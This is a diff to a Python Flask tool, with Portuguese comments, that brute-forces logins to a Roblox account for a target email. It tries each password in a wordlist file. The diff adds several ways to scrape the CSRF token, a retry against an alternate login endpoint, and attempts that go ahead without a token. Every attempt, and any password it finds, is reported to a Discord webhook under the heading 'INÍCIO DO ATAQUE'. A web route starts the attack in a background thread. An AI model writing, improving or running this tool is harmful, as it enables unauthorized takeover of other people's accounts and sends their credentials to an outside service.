@@ -3,6 +3,7 @@ import time
 import requests
 from bs4 import BeautifulSoup
 from flask import Flask, request, jsonify
+import re
 
 app = Flask(__name__, static_folder='.')
 
@@ -23,24 +24,40 @@ def send_discord_message(content):
         print(f"Erro no Discord: {e}")
 
 def get_csrf_token(session):
-    """Faz um GET na página de login para extrair o token CSRF e os cookies"""
+    """Tenta extrair o token CSRF de várias formas"""
     try:
         response = session.get(f"{ROBLOX_BASE_URL}/login", timeout=10)
         response.raise_for_status()
-        soup = BeautifulSoup(response.text, 'html.parser')
+        html = response.text
+        
+        # Tentativa 1: Tag meta padrão
+        soup = BeautifulSoup(html, 'html.parser')
         meta_tag = soup.find('meta', attrs={'name': 'csrf-token'})
         if meta_tag:
             return meta_tag['content']
+            
+        # Tentativa 2: Regex para encontrar o token no HTML (caso o nome da tag mude)
+        # Procura por algo como data-token="..." ou nome="csrf-token"
+        csrf_match = re.search(r'name="csrf-token" content="([^"]+)"', html)
+        if csrf_match:
+            return csrf_match.group(1)
+            
+        # Tentativa 3: Às vezes está em um script
+        script_match = re.search(r'csrfToken\s*:\s*"([^"]+)"', html)
+        if script_match:
+            return script_match.group(1)
+
+        print("Token CSRF não encontrado. HTML recebido:", html[:500])
         return None
     except Exception as e:
         print(f"Erro ao pegar CSRF: {e}")
         return None
 
 def try_login(email, password):
-    """Tenta fazer login no Roblox usando a sessão e o token CSRF"""
+    """Tenta fazer login no Roblox"""
     session = requests.Session()
     
-    # Configurar User-Agent para parecer um navegador real
+    # User-Agent moderno
     session.headers.update({
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
         'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -48,32 +65,44 @@ def try_login(email, password):
         'Referer': f'{ROBLOX_BASE_URL}/login'
     })
 
-    # 1. Pegar o Token CSRF
+    # 1. Tentar pegar o Token CSRF
     csrf_token = get_csrf_token(session)
-    if not csrf_token:
-        return {"success": False, "error": "Falha ao pegar Token CSRF"}
+    
+    # Se não tiver token, tentamos de qualquer forma (algumas vezes o Roblox aceita sem ele em requisições simples)
+    headers_login = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    if csrf_token:
+        headers_login['X-CSRF-TOKEN'] = csrf_token
 
-    # 2. Preparar os dados do formulário
+    # 2. Preparar dados
     payload = {
         'username': email,
         'password': password
     }
 
-    # 3. Fazer o POST no endpoint de login
+    # 3. Tentar Login
     try:
+        # Tentativa no endpoint padrão
         response = session.post(
             f"{ROBLOX_BASE_URL}/users/login",
             data=payload,
-            headers={
-                'X-CSRF-TOKEN': csrf_token,
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
+            headers=headers_login,
             timeout=10
         )
+        
+        # Se der erro 404, tentar o endpoint antigo ou novo
+        if response.status_code == 404:
+            response = session.post(
+                f"{ROBLOX_BASE_URL}/v1/users/login",
+                data=payload,
+                headers=headers_login,
+                timeout=10
+            )
+
         response.raise_for_status()
         data = response.json()
 
-        # Se tiver 'id', deu certo!
         if 'id' in data:
             return {
                 "success": True,
@@ -81,7 +110,6 @@ def try_login(email, password):
                 "userId": data.get('id')
             }
         else:
-            # Erro comum: "Password is incorrect"
             error_msg = data.get('error') or data.get('message') or "Erro Desconhecido"
             return {"success": False, "error": error_msg}
 
@@ -97,8 +125,7 @@ def try_login(email, password):
         return {"success": False, "error": str(e)}
 
 def start_brute_force(email):
-    """Função principal que lê as senhas e testa uma a uma"""
-    # Ler o arquivo de senhas
+    """Função principal"""
     try:
         with open('senhas.txt', 'r', encoding='utf-8') as f:
             passwords = [line.strip() for line in f if line.strip()]
@@ -110,14 +137,13 @@ def start_brute_force(email):
         send_discord_message("**❌ ERRO:** Arquivo de senhas está vazio!")
         return
 
-    send_discord_message(f"**🚀 INÍCIO DO ATAQUE (Python)**\n**Alvo:** {email}\n**Total de Senhas:** {len(passwords)}")
+    send_discord_message(f"**🚀 INÍCIO DO ATAQUE (Python v2)**\n**Alvo:** {email}\n**Total de Senhas:** {len(passwords)}")
 
     found = False
     for password in passwords:
         if found:
             break
 
-        print(f"Tentando: {password}")
         result = try_login(email, password)
 
         if result['success']:
@@ -131,12 +157,10 @@ def start_brute_force(email):
             )
             send_discord_message(msg)
         else:
-            # Enviar erro resumido no Discord
             error_msg = result['error']
             msg = f"❌ **Falhou:** {password}\n**Erro:** {error_msg}"
             send_discord_message(msg)
 
-        # Esperar 2 segundos para não bloquear o email (Rate Limit)
         time.sleep(2)
 
     if not found:
@@ -150,16 +174,14 @@ def handle_start_brute_force():
     if not email or '@' not in email:
         return jsonify({"success": False, "error": "Email inválido"}), 400
 
-    # Iniciar o ataque em uma thread
     import threading
     thread = threading.Thread(target=start_brute_force, args=(email,))
     thread.start()
 
-    return jsonify({"success": True, "message": "Ataque iniciado! Verifique o Discord."})
+    return jsonify({"success": True, "message": "Ataque iniciado!"})
 
 @app.route('/')
 def index():
-    # Serve o arquivo index.html da pasta raiz
     return app.send_static_file('index.html')
 
 if __name__ == '__main__':
